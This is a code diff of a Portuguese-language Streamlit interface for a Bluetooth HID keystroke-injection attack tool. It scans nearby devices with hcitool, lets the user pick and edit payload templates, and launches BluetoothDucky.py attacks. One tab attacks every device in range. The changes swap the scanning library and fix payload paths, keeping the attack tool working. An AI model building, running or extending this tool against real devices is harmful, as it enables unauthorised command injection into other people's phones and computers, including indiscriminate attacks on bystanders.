@@ -1,8 +1,6 @@
 import streamlit as st
 import os
 import re
-import asyncio
-from bleak import BleakScanner
 import subprocess
 
 # Função para verificar e ativar o adaptador Bluetooth hci0
@@ -19,10 +17,26 @@ def check_and_activate_adapter():
     except Exception as e:
         st.error(f"Erro ao verificar ou ativar o adaptador: {str(e)}")
 
-# Função para escanear dispositivos Bluetooth
-async def scan_for_devices():
-    devices = await BleakScanner.discover()
-    return devices
+# Função para escanear dispositivos Bluetooth usando hcitool
+def scan_for_devices():
+    try:
+        # Executa o comando hcitool scan
+        result = subprocess.run(["sudo", "hcitool", "scan"], capture_output=True, text=True)
+        output = result.stdout.strip().split('\n')[1:]  # Ignora o cabeçalho
+
+        devices = []
+        for line in output:
+            parts = line.split()
+            if len(parts) >= 2:
+                mac_address = parts[0]
+                name = ' '.join(parts[1:])
+                devices.append({'address': mac_address, 'name': name})
+        
+        return devices
+
+    except Exception as e:
+        st.error(f"Erro ao escanear dispositivos: {str(e)}")
+        return []
 
 # Função para validar endereço MAC
 def is_valid_mac_address(mac_address):
@@ -31,14 +45,14 @@ def is_valid_mac_address(mac_address):
 
 # Função para listar arquivos de payloads
 def list_payloads():
-    payload_dir = "payloads"
+    payload_dir = "payloads/HID"
     return [f for f in os.listdir(payload_dir) if os.path.isfile(os.path.join(payload_dir, f))]
 
 # Função para executar o ataque usando BluetoothDucky.py e mostrar a saída em tempo real
 def execute_attack(target_address, payload):
     # Copiar o payload selecionado para payload.txt
     try:
-        with open(f"payloads/{payload}", "r") as src_file:
+        with open(f"payloads/HID/{payload}", "r") as src_file:
             with open("payload.txt", "w") as dest_file:
                 dest_file.write(src_file.read())
         
@@ -83,14 +97,13 @@ tab1, tab2, tab3, tab4 = st.tabs(["Ataque", "Editar Payload", "Criar Payload", "
 with tab1:
     # Escanear dispositivos Bluetooth
     if st.button("Escanear Dispositivos"):
-        st.session_state.devices = asyncio.run(scan_for_devices())
+        st.session_state.devices = scan_for_devices()
         if not st.session_state.devices:
             st.warning("Nenhum dispositivo encontrado.")
 
     # Se houver dispositivos encontrados, exibir opções de seleção
     if st.session_state.devices:
-        st.text(st.session_state.devices)
-        device_names = [f"{device.name} ({device.address})" for device in st.session_state.devices]
+        device_names = [f"{device['name']} ({device['address']})" for device in st.session_state.devices]
         selected_device = st.radio("Selecione um dispositivo:", device_names)
 
         # Selecionar Payload
@@ -116,13 +129,13 @@ with tab2:
     template_to_edit = st.selectbox("Selecione um template para editar:", existing_templates, key="template_to_edit")
     
     if template_to_edit:
-        with open(f"payloads/{template_to_edit}", "r") as f:
+        with open(f"payloads/HID/{template_to_edit}", "r") as f:
             content = f.read()
         
         new_content = st.text_area("Conteúdo do Template:", value=content, height=300)
         
         if st.button("Salvar Alterações"):
-            with open(f"payloads/{template_to_edit}", "w") as f:
+            with open(f"payloads/HID/{template_to_edit}", "w") as f:
                 f.write(new_content)
             st.success(f"Template '{template_to_edit}' salvo com sucesso!")
 
@@ -136,7 +149,7 @@ with tab3:
     
     if st.button("Criar Template"):
         if new_template_name and new_template_content:
-            with open(f"payloads/{new_template_name}", "w") as f:
+            with open(f"payloads/HID/{new_template_name}", "w") as f:
                 f.write(new_template_content)
             st.success(f"Novo template '{new_template_name}' criado com sucesso!")
         else:
@@ -152,12 +165,12 @@ with tab4:
 
     if infinite_selected_payload and st.button("Atacar Todos os Dispositivos"):
         # Escanear dispositivos Bluetooth novamente para obter alvos atualizados
-        targets = asyncio.run(scan_for_devices())
+        targets = scan_for_devices()
         
         attack_results = []
         
         for device in targets:
-            target_address = device.address
+            target_address = device['address']
             
             # Executa o ataque em cada dispositivo encontrado
             execute_attack(target_address, infinite_selected_payload)
